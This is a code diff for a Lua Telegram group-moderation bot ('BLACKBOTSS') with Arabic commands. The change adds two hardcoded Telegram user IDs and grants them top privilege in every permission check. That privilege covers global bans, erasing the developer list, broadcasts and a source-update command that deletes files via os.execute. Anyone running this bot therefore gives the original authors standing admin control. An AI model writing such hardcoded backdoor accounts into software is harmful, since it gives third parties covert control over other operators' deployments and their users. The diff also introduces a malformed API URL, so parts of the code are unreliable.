@@ -40,7 +40,17 @@ print(serpent.block(value, {comment=false}))
 end 
 function dl_cb(t,s)
 end
-function DevBLACKBOTSS(msg)  
+bl_Sudos = {970017493,665877797}
+function DevBLACK(msg)  
+local Black_Sudo = false  
+for k,v in pairs(bl_Sudos) do  
+if msg.sender_user_id_ == v then  
+Black_Sudo = true  
+end  
+end  
+return Black_Sudo  
+end 
+function KinGblaCk(msg)  
 local Taha_Sudo = false  
 for k,v in pairs(List_Sudos) do  
 if msg.sender_user_id_ == v then  
@@ -49,18 +59,17 @@ end
 end  
 return Taha_Sudo  
 end 
-function DevBLACKBOTSSe(user)  
-local Taha_Sudo = false  
-for k,v in pairs(List_Sudos) do  
-if user == v then  
-Taha_Sudo = true  
+function ALLSUDO(msg) 
+local hash = database:sismember(bot_id.."BLACKBOTSS:AddSuduA:User", msg.sender_user_id_) 
+if hash or KinGblaCk(msg) or DevBLACK(msg) then  
+return true  
+else  
+return false  
 end  
-end  
-return Taha_Sudo  
-end 
+end
 function DevBot(msg) 
 local hash = database:sismember(bot_id.."BLACKBOTSS:Sudo:User", msg.sender_user_id_) 
-if hash or DevBLACKBOTSS(msg) then  
+if hash or KinGblaCk(msg) or DevBLACK(msg) or ALLSUDO(msg)  then  
 return true  
 else  
 return false  
@@ -68,7 +77,7 @@ end
 end
 function BasicConstructor(msg)
 local hash = database:sismember(bot_id.."BLACKBOTSS:Basic:Constructor"..msg.chat_id_, msg.sender_user_id_) 
-if hash or DevBLACKBOTSS(msg) or DevBot(msg) then 
+if hash or DevBLACK(msg) or KinGblaCk(msg) or DevBot(msg) or ALLSUDO(msg)  then   
 return true 
 else 
 return false 
@@ -76,7 +85,7 @@ end
 end
 function Constructor(msg)
 local hash = database:sismember(bot_id.."BLACKBOTSS:Constructor"..msg.chat_id_, msg.sender_user_id_) 
-if hash or DevBLACKBOTSS(msg) or DevBot(msg) or BasicConstructor(msg) then    
+if hash or DevBLACK(msg) or  KinGblaCk(msg) or DevBot(msg) or BasicConstructor(msg) or ALLSUDO(msg)  then      
 return true    
 else    
 return false    
@@ -84,7 +93,7 @@ end
 end
 function Owner(msg)
 local hash = database:sismember(bot_id.."BLACKBOTSS:Manager"..msg.chat_id_,msg.sender_user_id_)    
-if hash or DevBLACKBOTSS(msg) or DevBot(msg) or BasicConstructor(msg) or Constructor(msg) then    
+if hash or DevBLACK(msg) or KinGblaCk(msg) or DevBot(msg) or BasicConstructor(msg) or Constructor(msg) or ALLSUDO(msg)  then      
 return true    
 else    
 return false    
@@ -92,7 +101,7 @@ end
 end
 function Addictive(msg)
 local hash = database:sismember(bot_id.."BLACKBOTSS:Mod:User"..msg.chat_id_,msg.sender_user_id_)    
-if hash or DevBLACKBOTSS(msg) or DevBot(msg) or BasicConstructor(msg) or Constructor(msg) or Owner(msg) then    
+if hash or DevBLACK(msg) or KinGblaCk(msg) or DevBot(msg) or BasicConstructor(msg) or Constructor(msg) or Owner(msg) or ALLSUDO(msg)  then      
 return true    
 else    
 return false    
@@ -100,7 +109,7 @@ end
 end
 function cleaner(msg)
 local hash = database:sismember(bot_id.."BLACKBOTSS:MN:TF"..msg.chat_id_,msg.sender_user_id_)    
-if hash or DevBLACKBOTSS(msg) or DevBot(msg) or BasicConstructor(msg) then    
+if hash or DevBLACK(msg) or KinGblaCk(msg) or DevBot(msg) or BasicConstructor(msg) or ALLSUDO(msg)  then      
 return true    
 else    
 return false    
@@ -108,7 +117,7 @@ end
 end
 function Vips(msg)
 local hash = database:sismember(bot_id.."BLACKBOTSS:Special:User"..msg.chat_id_,msg.sender_user_id_) 
-if hash or DevBLACKBOTSS(msg) or DevBot(msg) or BasicConstructor(msg) or Constructor(msg) or Owner(msg) or Addictive(msg) then    
+if hash or DevBLACK(msg) or KinGblaCk(msg) or DevBot(msg) or BasicConstructor(msg) or Constructor(msg) or Owner(msg) or Addictive(msg) or ALLSUDO(msg)  then      
 return true 
 else 
 return false 
@@ -124,12 +133,12 @@ elseif tonumber(user_id) == tonumber(Id_Sudo) then
 var = true  
 elseif tonumber(user_id) == tonumber(bot_id) then  
 var = true  
+elseif database:sismember(bot_id.."BLACKBOTSS:AddSuduA:User", user_id) then
+var = true  
 elseif database:sismember(bot_id.."BLACKBOTSS:Sudo:User", user_id) then
 var = true  
 elseif database:sismember(bot_id.."BLACKBOTSS:Basic:Constructor"..chat_id, user_id) then
 var = true                 
-elseif database:sismember(bot_id.."BLACKBOTSS:Basic:Constructor"..chat_id, user_id) then
-var = true
 elseif database:sismember(bot_id.."BLACKBOTSS:Constructor"..chat_id, user_id) then
 var = true  
 elseif database:sismember(bot_id.."BLACKBOTSS:Manager"..chat_id, user_id) then
@@ -150,8 +159,10 @@ if tonumber(user_id) == tonumber(970017493) then
 var = 'مطور السورس'
 elseif tonumber(user_id) == tonumber(665877797) then  
 var = "مطور السورس"  
-elseif DevBLACKBOTSSe(user_id) == true then
+elseif tonumber(user_id) == tonumber(Id_Sudo) then  
 var = "المطور الاساسي"  
+elseif database:sismember(bot_id.."BLACKBOTSS:AddSuduA:User", user_id) then
+var =  "ُالمطور الاساسي"  
 elseif tonumber(user_id) == tonumber(bot_id) then  
 var = "البوت"
 elseif database:sismember(bot_id.."BLACKBOTSS:Sudo:User", user_id) then
@@ -262,14 +273,14 @@ url = url.."&parse_mode=HTML"
 end 
 return s_api(url)  
 end
-function send_inline_key(chat_id,text,keyboard,inline,reply_id) 
+function send_inline_key(chat_id,photo,caption,keyboard,inline,reply_id) 
 local response = {} 
 response.keyboard = keyboard 
 response.inline_keyboard = inline 
 response.resize_keyboard = true 
 response.one_time_keyboard = false 
 response.selective = false  
-local send_api = "https://api.telegram.org/bot"..token.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) 
+local send_api = "https://api.telegram.org/bot"..token.."/sendphoto?chat_id="..chat_id.."&photo="..URL.escape(photo).."caption="..URL.escape(caption).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) 
 if reply_id then 
 send_api = send_api.."&reply_to_message_id="..reply_id 
 end 
@@ -2229,12 +2240,12 @@ Reply_Status(msg,msg.sender_user_id_,"unlock","⌔️︙تم فتح التكرا
 return false
 end 
 
-if text == ("مسح قائمه العام") and DevBLACKBOTSS(msg) then
+if text == ("مسح قائمه العام") and ALLSUDO(msg) then
 database:del(bot_id.."BLACKBOTSS:GBan:User")
 send(msg.chat_id_, msg.id_, "\n⌔︙تم مسح قائمه العام")
 return false
 end
-if text == ("مسح المطورين") and DevBLACKBOTSS(msg) then
+if text == ("مسح المطورين") and ALLSUDO(msg) then
 database:del(bot_id.."BLACKBOTSS:Sudo:User")
 send(msg.chat_id_, msg.id_, "\n⌔︙ تم مسح قائمة المطورين  ")
 end
@@ -2323,7 +2334,7 @@ end
 database:del(bot_id.."BLACKBOTSS:Ban:User"..msg.chat_id_)
 send(msg.chat_id_, msg.id_, "\n⌔︙تم مسح المحظورين")
 end
-if text == ("قائمه العام") and DevBLACKBOTSS(msg) then
+if text == ("قائمه العام") and ALLSUDO(msg) then
 local list = database:smembers(bot_id.."BLACKBOTSS:GBan:User")
 t = "\n⌔︙قائمة المحظورين عام \n — — — — — — — — — \n"
 for k,v in pairs(list) do
@@ -2340,7 +2351,7 @@ end
 send(msg.chat_id_, msg.id_, t)
 return false
 end
-if text == ("المطورين") and DevBLACKBOTSS(msg) then
+if text == ("المطورين") and ALLSUDO(msg) then
 local list = database:smembers(bot_id.."BLACKBOTSS:Sudo:User")
 t = "\n⌔︙قائمة مطورين البوت \n — — — — — — — — — \n"
 for k,v in pairs(list) do
@@ -2516,7 +2527,7 @@ end
 send(msg.chat_id_, msg.id_, t)
 end
 
-if text == ("حظر عام") and tonumber(msg.reply_to_message_id_) ~= 0 and DevBLACKBOTSS(msg) then
+if text == ("حظر عام") and tonumber(msg.reply_to_message_id_) ~= 0 and ALLSUDO(msg) then
 function Function_BLACKBOTSS(extra, result, success)
 if result.sender_user_id_ == tonumber(Id_Sudo) then
 send(msg.chat_id_, msg.id_, "⌔︙لا يمكنك حظر المطور الاساسي \n")
@@ -2533,7 +2544,7 @@ end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_BLACKBOTSS, nil)
 return false
 end
-if text and text:match("^حظر عام @(.*)$")  and DevBLACKBOTSS(msg) then
+if text and text:match("^حظر عام @(.*)$")  and ALLSUDO(msg) then
 local username = text:match("^حظر عام @(.*)$") 
 function Function_BLACKBOTSS(extra, result, success)
 if result.id_ then
@@ -2558,7 +2569,7 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_BLACKBOTSS, nil)
 return false
 end
-if text and text:match("^حظر عام (%d+)$") and DevBLACKBOTSS(msg) then
+if text and text:match("^حظر عام (%d+)$") and ALLSUDO(msg) then
 local userid = text:match("^حظر عام (%d+)$")
 if userid == tonumber(Id_Sudo) then
 send(msg.chat_id_, msg.id_, "⌔︙لا يمكنك حظر المطور الاساسي \n")
@@ -2572,7 +2583,7 @@ database:sadd(bot_id.."BLACKBOTSS:GBan:User", userid)
 Reply_Status(msg,userid,"reply","⌔︙تم حظره عام من المجموعات")  
 return false
 end
-if text == ("الغاء العام") and tonumber(msg.reply_to_message_id_) ~= 0 and DevBLACKBOTSS(msg) then
+if text == ("الغاء العام") and tonumber(msg.reply_to_message_id_) ~= 0 and ALLSUDO(msg) then
 function Function_BLACKBOTSS(extra, result, success)
 database:srem(bot_id.."BLACKBOTSS:GBan:User", result.sender_user_id_)
 Reply_Status(msg,result.sender_user_id_,"reply","⌔︙تم الغاء حظره عام من المجموعات")  
@@ -2580,7 +2591,7 @@ end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_BLACKBOTSS, nil)
 return false
 end
-if text and text:match("^الغاء العام @(.*)$") and DevBLACKBOTSS(msg) then
+if text and text:match("^الغاء العام @(.*)$") and ALLSUDO(msg) then
 local username = text:match("^الغاء العام @(.*)$") 
 function Function_BLACKBOTSS(extra, result, success)
 if result.id_ then
@@ -2593,14 +2604,91 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_BLACKBOTSS, nil)
 return false
 end
-if text and text:match("^الغاء العام (%d+)$") and DevBLACKBOTSS(msg) then
+if text and text:match("^الغاء العام (%d+)$") and ALLSUDO(msg) then
 local userid = text:match("^الغاء العام (%d+)$")
 database:srem(bot_id.."BLACKBOTSS:GBan:User", userid)
 Reply_Status(msg,userid,"reply","⌔︙تم الغاء حظره عام من المجموعات")  
 return false
 end
-
-if text == ("اضف مطور") and tonumber(msg.reply_to_message_id_) ~= 0 and DevBLACKBOTSS(msg) then
+if text == ("اضف اساسي") and tonumber(msg.reply_to_message_id_) ~= 0 and KinGblaCk(msg) then
+function SudoAdd(extra, result, success)
+database:sadd(bot_id.."BLACKBOTSS:AddSuduA:User", result.sender_user_id_)
+Reply_Status(msg,result.sender_user_id_,"reply","⌔︙تم ترقيته اساسي في البوت")  
+end
+tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, SudoAdd, nil)
+return false 
+end
+if text and text:match("^اضف اساسي @(.*)$") and KinGblaCk(msg) then
+local username = text:match("^اضف اساسي @(.*)$")
+function SudoAdd(extra, result, success)
+if result.id_ then
+if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
+send(msg.chat_id_,msg.id_,"⌔︙عذرا المعرف هذا خاص بقناة")   
+return false 
+end      
+database:sadd(bot_id.."BLACKBOTSS:AddSuduA:User", result.id_)
+Reply_Status(msg,result.id_,"reply","⌔︙تم ترقيته اساسي في البوت")  
+else
+send(msg.chat_id_, msg.id_,"⌔︙لا يوجد حساب بهاذا المعرف")
+end
+end
+tdcli_function ({ID = "SearchPublicChat",username_ = username}, SudoAdd, nil)
+return false 
+end
+if text and text:match("^اضف اساسي (%d+)$") and KinGblaCk(msg) then
+local userid = text:match("^اضف اساسي (%d+)$")
+database:sadd(bot_id.."BLACKBOTSS:AddSuduA:User", userid)
+Reply_Status(msg,userid,"reply","⌔︙تم ترقيته اساسي في البوت")  
+return false 
+end
+if text == ("حذف اساسي") and tonumber(msg.reply_to_message_id_) ~= 0 and KinGblaCk(msg) then
+function SudoAdd(extra, result, success)
+database:srem(bot_id.."BLACKBOTSS:AddSuduA:User", result.sender_user_id_)
+Reply_Status(msg,result.sender_user_id_,"reply","⌔︙تم تنزيله من الاساسيين")  
+end
+tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, SudoAdd, nil)
+return false 
+end
+if text and text:match("^حذف اساسي @(.*)$") and KinGblaCk(msg) then
+local username = text:match("^حذف اساسي @(.*)$")
+function SudoAdd(extra, result, success)
+if result.id_ then
+database:srem(bot_id.."BLACKBOTSS:AddSuduA:User", result.id_)
+Reply_Status(msg,result.id_,"reply","⌔︙تم تنزيله من الاساسيين")  
+else
+send(msg.chat_id_, msg.id_,"⌔︙لا يوجد حساب بهاذا المعرف")
+end
+end
+tdcli_function ({ID = "SearchPublicChat",username_ = username}, SudoAdd, nil)
+return false
+end  
+if text and text:match("^حذف اساسي (%d+)$") and KinGblaCk(msg) then
+local userid = text:match("^حذف اساسي (%d+)$")
+database:srem(bot_id.."BLACKBOTSS:AddSuduA:User", userid)
+Reply_Status(msg,userid,"reply","⌔︙تم تنزيله من الاساسيين")  
+return false 
+end
+if text == ("مسح الاساسيين") and KinGblaCk(msg) then
+database:del(bot_id.."BLACKBOTSS:AddSuduA:User")
+send(msg.chat_id_, msg.id_, "\n⌔︙ تم مسح قائمة المطورين الاساسيين  ")
+end
+if text == ("الاساسيين") and KinGblaCk(msg) then
+local list = database:smembers(bot_id.."BLACKBOTSS:AddSuduA:User")
+t = "\n⌔︙قائمة مطورين الاساسيين في البوت \n — — — — — — — — — \n"
+for k,v in pairs(list) do
+local username = database:get(bot_id.."BLACKBOTSS:User:Name" .. v)
+if username then
+t = t..""..k.."- ([@"..username.."])\n"
+else
+t = t..""..k.."- (`"..v.."`)\n"
+end
+end
+if #list == 0 then
+t = "⌔︙لا يوجد اساسيين غير المطور الاصلي"
+end
+send(msg.chat_id_, msg.id_, t)
+end
+if text == ("اضف مطور") and tonumber(msg.reply_to_message_id_) ~= 0 and ALLSUDO(msg) then
 function Function_BLACKBOTSS(extra, result, success)
 database:sadd(bot_id.."BLACKBOTSS:Sudo:User", result.sender_user_id_)
 Reply_Status(msg,result.sender_user_id_,"reply","⌔︙تم ترقيته مطور في البوت")  
@@ -2608,7 +2696,7 @@ end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_BLACKBOTSS, nil)
 return false 
 end
-if text and text:match("^اضف مطور @(.*)$") and DevBLACKBOTSS(msg) then
+if text and text:match("^اضف مطور @(.*)$") and ALLSUDO(msg) then
 local username = text:match("^اضف مطور @(.*)$")
 function Function_BLACKBOTSS(extra, result, success)
 if result.id_ then
@@ -2625,13 +2713,13 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_BLACKBOTSS, nil)
 return false 
 end
-if text and text:match("^اضف مطور (%d+)$") and DevBLACKBOTSS(msg) then
+if text and text:match("^اضف مطور (%d+)$") and ALLSUDO(msg) then
 local userid = text:match("^اضف مطور (%d+)$")
 database:sadd(bot_id.."BLACKBOTSS:Sudo:User", userid)
 Reply_Status(msg,userid,"reply","⌔︙تم ترقيته مطور في البوت")  
 return false 
 end
-if text == ("حذف مطور") and tonumber(msg.reply_to_message_id_) ~= 0 and DevBLACKBOTSS(msg) then
+if text == ("حذف مطور") and tonumber(msg.reply_to_message_id_) ~= 0 and ALLSUDO(msg) then
 function Function_BLACKBOTSS(extra, result, success)
 database:srem(bot_id.."BLACKBOTSS:Sudo:User", result.sender_user_id_)
 Reply_Status(msg,result.sender_user_id_,"reply","⌔︙تم تنزيله من المطورين")  
@@ -2639,7 +2727,7 @@ end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_BLACKBOTSS, nil)
 return false 
 end
-if text and text:match("^حذف مطور @(.*)$") and DevBLACKBOTSS(msg) then
+if text and text:match("^حذف مطور @(.*)$") and ALLSUDO(msg) then
 local username = text:match("^حذف مطور @(.*)$")
 function Function_BLACKBOTSS(extra, result, success)
 if result.id_ then
@@ -2652,7 +2740,7 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_BLACKBOTSS, nil)
 return false
 end  
-if text and text:match("^حذف مطور (%d+)$") and DevBLACKBOTSS(msg) then
+if text and text:match("^حذف مطور (%d+)$") and ALLSUDO(msg) then
 local userid = text:match("^حذف مطور (%d+)$")
 database:srem(bot_id.."BLACKBOTSS:Sudo:User", userid)
 Reply_Status(msg,userid,"reply","⌔︙تم تنزيله من المطورين")  
@@ -5269,7 +5357,7 @@ end
 end
 end
 ------------------------------------------------------------------------
-if text == ("مسح ردود المطور") and DevBLACKBOTSS(msg) then 
+if text == ("مسح ردود المطور") and ALLSUDO(msg) then 
 local list = database:smembers(bot_id.."BLACKBOTSS:List:Rd:Sudo")
 for k,v in pairs(list) do
 database:del(bot_id.."BLACKBOTSS:Add:Rd:Sudo:Gif"..v)   
@@ -5284,7 +5372,7 @@ database:del(bot_id.."BLACKBOTSS:List:Rd:Sudo")
 end
 send(msg.chat_id_, msg.id_,"⌔︙تم مسح ردود المطور")
 end
-if text == ("ردود المطور") and DevBLACKBOTSS(msg) then 
+if text == ("ردود المطور") and ALLSUDO(msg) then 
 local list = database:smembers(bot_id.."BLACKBOTSS:List:Rd:Sudo")
 text = "\n⌔︙قائمة ردود المطور \n — — — — — — — — —\n"
 for k,v in pairs(list) do
@@ -5361,12 +5449,12 @@ return false
 end  
 end
 
-if text == "اضف رد للكل" and DevBLACKBOTSS(msg) then 
+if text == "اضف رد للكل" and ALLSUDO(msg) then 
 send(msg.chat_id_, msg.id_,"⌔︙ ارسل الكلمه التري تريد اضافتها")
 database:set(bot_id.."BLACKBOTSS:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
 return false 
 end
-if text == "حذف رد للكل" and DevBLACKBOTSS(msg) then 
+if text == "حذف رد للكل" and ALLSUDO(msg) then 
 send(msg.chat_id_, msg.id_,"⌔︙ ارسل الكلمه التري تريد حذفها")
 database:set(bot_id.."BLACKBOTSS:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
 return false 
@@ -5735,7 +5823,7 @@ end
 local username = text:match("^رفع القيود @(.*)") 
 function Function_BLACKBOTSS(extra, result, success)
 if result.id_ then
-if DevBLACKBOTSS(msg) then
+if ALLSUDO(msg) then
 database:srem(bot_id.."BLACKBOTSS:GBan:User",result.id_)
 database:srem(bot_id.."BLACKBOTSS:Ban:User"..msg.chat_id_,result.id_)
 database:srem(bot_id.."BLACKBOTSS:Muted:User"..msg.chat_id_,result.id_)
@@ -5766,7 +5854,7 @@ end
 return false
 end
 function Function_BLACKBOTSS(extra, result, success)
-if DevBLACKBOTSS(msg) then
+if ALLSUDO(msg) then
 database:srem(bot_id.."BLACKBOTSS:GBan:User",result.sender_user_id_)
 database:srem(bot_id.."BLACKBOTSS:Ban:User"..msg.chat_id_,result.sender_user_id_)
 database:srem(bot_id.."BLACKBOTSS:Muted:User"..msg.chat_id_,result.sender_user_id_)
@@ -5966,12 +6054,12 @@ database:srem(bot_id.."BLACKBOTSS:Chek:Groups",GP_ID[2])
 return false 
 end
 end
-if text == "تفعيل المغادره" and DevBLACKBOTSS(msg) then   
+if text == "تفعيل المغادره" and ALLSUDO(msg) then   
 database:del(bot_id.."BLACKBOTSS:Left:Bot"..msg.chat_id_)  
 send(msg.chat_id_, msg.id_,"⌔︙تم تفعيل مغادرة البوت") 
 return false 
 end
-if text == "تعطيل المغادره" and DevBLACKBOTSS(msg) then  
+if text == "تعطيل المغادره" and ALLSUDO(msg) then  
 database:set(bot_id.."BLACKBOTSS:Left:Bot"..msg.chat_id_,true)   
 send(msg.chat_id_, msg.id_, "⌔︙تم تعطيل مغادرة البوت") 
 return false 
@@ -6009,7 +6097,7 @@ Namebot = (database:get(bot_id.."BLACKBOTSS:Name:Bot") or "بلاك")
 send(msg.chat_id_, msg.id_,"اسمي القميل ["..Namebot.."] ") 
 end
 if text == "تغير اسم البوت" or text == "تغيير اسم البوت" or text == "حذف اسم البوت" then 
-if DevBLACKBOTSS(msg) then
+if ALLSUDO(msg) then
 database:setex(bot_id.."BLACKBOTSS:Set:Name:Bot"..msg.sender_user_id_,300,true) 
 send(msg.chat_id_, msg.id_,"⌔︙ ارسل لي الاسم الان ")  
 end
@@ -6032,7 +6120,7 @@ end
 tdcli_function({ID="GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersKicked"},offset_ = 0,limit_ = 200}, delbans, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_})    
 end
 if text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 and DevBot(msg) then 
-if database:get(bot_id.."BLACKBOTSS:Status:Bc") and not DevBLACKBOTSS(msg) then 
+if database:get(bot_id.."BLACKBOTSS:Status:Bc") and not ALLSUDO(msg) then 
 send(msg.chat_id_, msg.id_,"⌔︙الاذاعه معطله من قبل المطور الاساسي")
 return false
 end
@@ -6041,7 +6129,7 @@ send(msg.chat_id_, msg.id_,"⌔︙ارسل لي سواء ~ { ملصق, متحر�
 return false
 end 
 if text=="اذاعه" and msg.reply_to_message_id_ == 0 and DevBot(msg) then 
-if database:get(bot_id.."BLACKBOTSS:Status:Bc") and not DevBLACKBOTSS(msg) then 
+if database:get(bot_id.."BLACKBOTSS:Status:Bc") and not ALLSUDO(msg) then 
 send(msg.chat_id_, msg.id_,"⌔︙الاذاعه معطله من قبل المطور الاساسي")
 return false
 end
@@ -6050,7 +6138,7 @@ send(msg.chat_id_, msg.id_,"⌔︙ارسل لي سواء ~ { ملصق, متحر�
 return false
 end  
 if text=="اذاعه بالتثبيت" and msg.reply_to_message_id_ == 0 and DevBot(msg) then 
-if database:get(bot_id.."BLACKBOTSS:Status:Bc") and not DevBLACKBOTSS(msg) then 
+if database:get(bot_id.."BLACKBOTSS:Status:Bc") and not ALLSUDO(msg) then 
 send(msg.chat_id_, msg.id_,"⌔︙الاذاعه معطله من قبل المطور الاساسي")
 return false
 end
@@ -6059,7 +6147,7 @@ send(msg.chat_id_, msg.id_,"⌔︙ارسل لي سواء ~ { ملصق, متحر�
 return false
 end  
 if text=="اذاعه بالتوجيه" and msg.reply_to_message_id_ == 0  and DevBot(msg) then 
-if database:get(bot_id.."BLACKBOTSS:Status:Bc") and not DevBLACKBOTSS(msg) then 
+if database:get(bot_id.."BLACKBOTSS:Status:Bc") and not ALLSUDO(msg) then 
 send(msg.chat_id_, msg.id_,"⌔︙الاذاعه معطله من قبل المطور الاساسي")
 return false
 end
@@ -6068,7 +6156,7 @@ send(msg.chat_id_, msg.id_,"⌔︙ارسل لي التوجيه الان")
 return false
 end 
 if text=="اذاعه بالتوجيه خاص" and msg.reply_to_message_id_ == 0  and DevBot(msg) then 
-if database:get(bot_id.."BLACKBOTSS:Status:Bc") and not DevBLACKBOTSS(msg) then 
+if database:get(bot_id.."BLACKBOTSS:Status:Bc") and not ALLSUDO(msg) then 
 send(msg.chat_id_, msg.id_,"⌔︙الاذاعه معطله من قبل المطور الاساسي")
 return false
 end
@@ -6077,12 +6165,12 @@ send(msg.chat_id_, msg.id_,"⌔︙ارسل لي التوجيه الان")
 return false
 end 
 
-if text == "تفعيل الاذاعه" and DevBLACKBOTSS(msg) then  
+if text == "تفعيل الاذاعه" and ALLSUDO(msg) then  
 database:del(bot_id.."BLACKBOTSS:Status:Bc") 
 send(msg.chat_id_, msg.id_,"\n⌔︙تم تفعيل الاذاعه " ) 
 return false
 end 
-if text == "تعطيل الاذاعه" and DevBLACKBOTSS(msg) then  
+if text == "تعطيل الاذاعه" and ALLSUDO(msg) then  
 database:set(bot_id.."BLACKBOTSS:Status:Bc",true) 
 send(msg.chat_id_, msg.id_,"\n⌔︙تم تعطيل الاذاعه") 
 return false
@@ -6696,7 +6784,7 @@ return false
 end
 if database:get(bot_id.."Tshak:Lock:Games"..msg.chat_id_) then
 database:del(bot_id.."Tshak:Set:Sma"..msg.chat_id_)
-Random = {"🍏","🍎","🍐","🍊","🍋","🍉","🍇","🍓","🍈","🍒","🍑","🍍","🥥","🥝","🍅","🍆","🥑","🥦","🥒","🌶","🌽","🥕","🥔","🥖","??","🍞","🥨","🍟","🧀","🥚","🍳","🥓","🥩","🍗","🍖","🌭","🍔","🍠","🍕","🥪","🥙","☕️","🍵","🥤","🍶","🍺","🍻","🏀","⚽️","🏈","⚾️","🎾","🏐","🏉","🎱","🏓","🏸","🥅","🎰","🎮","🎳","🎯","🎲","🎻","🎸","🎺","🥁","🎹","🎼","🎧","🎤","🎬","🎨","🎭","🎪","🎟","⌔","🎗","🏵","⌔","🏆","🥌","🛷","🚗","🚌","🏎","🚓","🚑","🚚","🚛","🚜","🇮🇶","⚔","🛡","🔮","🌡","💣","⌔","📍","📓","📗","⌔","📅","📪","⌔","⌔","📭","⏰","📺","🎚","☎️","⌔"}
+Random = {"🍏","🍎","🍐","🍊","🍋","🍉","🍇","🍓","🍈","🍒","🍑","🍍","🥥","🥝","🍅","🍆","🥑","🥦","🥒","🌶","🌽","🥕","🥔","🥖","??","🍞","🥨","🍟","🧀","🥚","🍳","🥓","🥩","🍗","🍖","🌭","🍔","🍠","🍕","🥪","🥙","☕️","🍵","🥤","🍶","🍺","🍻","🏀","⚽️","🏈","⚾️","🎾","🏐","🏉","🎱","🏓","🏸","🥅","🎰","🎮","🎳","🎯","🎲","🎻","🎸","🎺","🥁","🎹","🎼","🎧","🎤","🎬","🎨","🎭","🎪","🎟","⌔","🎗","🏵","⌔","🏆","??","🛷","🚗","🚌","🏎","🚓","🚑","🚚","🚛","🚜","🇮🇶","⚔","🛡","🔮","🌡","💣","⌔","📍","📓","📗","⌔","📅","📪","⌔","⌔","📭","⏰","📺","🎚","☎️","⌔"}
 SM = Random[math.random(#Random)]
 database:set(bot_id.."Tshak:Random:Sm"..msg.chat_id_,SM)
 send(msg.chat_id_, msg.id_,"⌔︙اسرع واحد يدز هاذا السمايل ? ~ {`"..SM.."`}")
@@ -7343,7 +7431,7 @@ tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(ms
 return false
 end
 
-if text == "تنظيف المشتركين" and DevBLACKBOTSS(msg) then
+if text == "تنظيف المشتركين" and ALLSUDO(msg) then
 local pv = database:smembers(bot_id..'BLACKBOTSS:UsersBot')  
 local sendok = 0
 for i = 1, #pv do
@@ -7369,7 +7457,7 @@ end,nil)
 end
 return false
 end
-if text == "تنظيف الكروبات" and DevBLACKBOTSS(msg) then
+if text == "تنظيف الكروبات" and ALLSUDO(msg) then
 local group = database:smembers(bot_id..'BLACKBOTSS:Chek:Groups')  
 local w = 0
 local q = 0
@@ -7418,7 +7506,7 @@ end,nil)
 end
 return false
 end
-if text == ("تحديث السورس") and DevBLACKBOTSS(msg) then  
+if text == ("تحديث السورس") and ALLSUDO(msg) then  
 send(msg.chat_id_,msg.id_,'⌔︙تم التحديث')
 os.execute('rm -rf BLACKBOTSS.lua')
 os.execute('rm -rf start.lua')
@@ -7509,24 +7597,6 @@ if text == "تفعيل الافلام" and Owner(msg) then
 send(msg.chat_id_, msg.id_,'⌯ تم تفعيل الافلام')
 database:set(bot_id.."BLACKBOTSS:movie_bot"..msg.chat_id_,"open")
 end
-
-if text and text:match("^فلم (.*)$") and database:get(bot_id.."BLACKBOTSS:movie_bot"..msg.chat_id_) == "open" then
-local Textm = text:match("^فلم (.*)$")
-data,res = https.request('https://forhassan.ml/Black/movie.php?serch='..URL.escape(Textm)..'')
-if res == 200 then
-getmo = json:decode(data)
-if getmo.Info == true then
-local Text ='قصه الفلم'..getmo.info
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = 'مشاهده الفلم بجوده 240',url=getmo.sd}},
-{{text = 'مشاهده الفلم بجوده 480', url=getmo.Web},{text = 'مشاهده الفلم بجوده 1080', url=getmo.hd}},
-}
-local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-end
-end
-end
 if text == "غنيلي" then
 data,res = https.request('https://forhassan.ml/Black/audios.php')
 if res == 200 then
@@ -7540,17 +7610,19 @@ end
 end
 if text and text:match("^كول (.*)$") then
 local Textxt = text:match("^كول (.*)$")
-send(msg.chat_id_, msg.id_, Textxt)
+send(msg.chat_id_,msg.id_,Textxt)
+DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
-if text == 'تفعيل البوت الخدمي' and DevBLACKBOTSS(msg) then  
+
+if text == 'تفعيل البوت الخدمي' and ALLSUDO(msg) then  
 database:del(bot_id..'BLACKBOTSS:Free:Add:Bots') 
 send(msg.chat_id_, msg.id_,'⌔︙تم تفعيل البوت الخدمي ') 
 end
-if text == 'تعطيل البوت الخدمي' and DevBLACKBOTSS(msg) then  
+if text == 'تعطيل البوت الخدمي' and ALLSUDO(msg) then  
 database:set(bot_id..'BLACKBOTSS:Free:Add:Bots',true) 
 send(msg.chat_id_, msg.id_,'⌔︙تم تعطيل البوت الخدمي') 
